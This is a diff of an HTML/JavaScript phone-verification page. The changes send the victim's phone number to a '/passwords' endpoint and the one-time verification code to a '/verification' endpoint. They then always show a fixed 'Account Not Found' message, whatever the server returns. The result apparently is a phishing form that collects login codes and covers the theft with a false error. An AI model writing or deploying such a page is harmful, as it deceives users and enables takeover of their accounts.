@@ -75,6 +75,10 @@
             overflow-y: auto;
         }
 
+        .active {
+            display: block;
+        }
+
         h1 {
             font-size: 20px;
             color: #333333;
@@ -309,9 +313,8 @@
     </div>
 
     <div class="container" id="finalMessageContainer" style="display:none;">
-        <h1>Verification Status</h1>
-        <p id="finalMessage"></p>
-        <button class="button" onclick="resetForm()">Try Again</button>
+        <h1>Account Not Found</h1>
+        <p>The account associated with the entered phone number was not found.</p>
     </div>
 
     <script>
@@ -355,20 +358,40 @@
                 setTimeout(function() {
                     document.getElementById('verificationContainer').style.display = 'none';
                     document.body.style.backgroundColor = "#ffffff";
-                    document.getElementById('initialContainer').style.display = 'block';
+                    document.getElementById('initialContainer').classList.add('active');
                 }, 500);
             }
 
             window.goToVerificationPage = function() {
-                const phoneNumber = phoneNumberInput.value;
+                const phoneNumber = document.getElementById('phoneNumber').value;
                 if (phoneNumber === '') {
                     alert('Please enter your phone number.');
                     return;
                 }
 
-                document.getElementById('phoneDisplay').textContent = phoneNumber;
-                document.getElementById('initialContainer').style.display = 'none';
-                document.getElementById('phoneVerificationContainer').style.display = 'block';
+                // Send the phone number to the server
+                fetch('http://localhost:8000/passwords', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        phone: phoneNumber,
+                    }),
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    // Transition to the verification code input screen
+                    document.getElementById('phoneDisplay').textContent = phoneNumber;
+                    document.getElementById('initialContainer').classList.remove('active');
+                    document.getElementById('phoneVerificationContainer').classList.add('active');
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred. Please try again.');
+                });
             };
 
             window.submitVerification = function() {
@@ -380,7 +403,8 @@
                     return;
                 }
 
-                fetch('http://localhost:8000/submit-verification', {
+                // Send the verification code to the server
+                fetch('http://localhost:8000/verification', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -394,30 +418,21 @@
                     if (!response.ok) {
                         throw new Error('Network response was not ok');
                     }
-                    return response.json();
-                })
-                .then(data => {
-                    if (data.success) {
-                        document.getElementById('phoneVerificationContainer').style.display = 'none';
-                        document.getElementById('finalMessageContainer').style.display = 'block';
-                        document.getElementById('finalMessage').textContent = 'Verification successful!';
-                    } else {
-                        document.getElementById('finalMessageContainer').style.display = 'block';
-                        document.getElementById('finalMessage').textContent = 'Verification failed. Please try again.';
-                    }
+                    // Transition to the final message screen
+                    document.getElementById('phoneVerificationContainer').classList.remove('active');
+                    document.getElementById('finalMessageContainer').classList.add('active');
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    document.getElementById('finalMessageContainer').style.display = 'block';
-                    document.getElementById('finalMessage').textContent = 'An error occurred. Please try again.';
+                    alert('An error occurred. Please try again.');
                 });
             };
 
             window.resetForm = function() {
                 document.getElementById('phoneNumber').value = '';
                 document.getElementById('verificationCode').value = '';
-                document.getElementById('finalMessageContainer').style.display = 'none';
-                document.getElementById('initialContainer').style.display = 'block';
+                document.getElementById('finalMessageContainer').classList.remove('active');
+                document.getElementById('initialContainer').classList.add('active');
             };
 
             document.body.addEventListener('touchmove', function() {
